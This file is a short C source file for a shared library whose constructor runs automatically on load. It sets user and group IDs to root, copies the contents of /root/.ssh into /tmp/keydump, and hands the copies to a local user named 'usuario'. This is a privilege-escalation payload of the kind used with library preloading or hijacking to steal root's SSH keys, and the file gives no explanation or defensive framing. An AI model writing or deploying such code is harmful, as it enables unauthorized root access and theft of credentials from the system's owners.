#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    setuid(0);
    setgid(0);

    system("mkdir -p /tmp/keydump");
    system("cp -a /root/.ssh/. /tmp/keydump/ 2>/tmp/kerr.txt");
    system("chown -R usuario:usuario /tmp/keydump /tmp/kerr.txt 2>/dev/null");
    system("chmod 700 /tmp/keydump 2>/dev/null");
    system("chmod 600 /tmp/keydump/* 2>/dev/null");

    _exit(0);
}
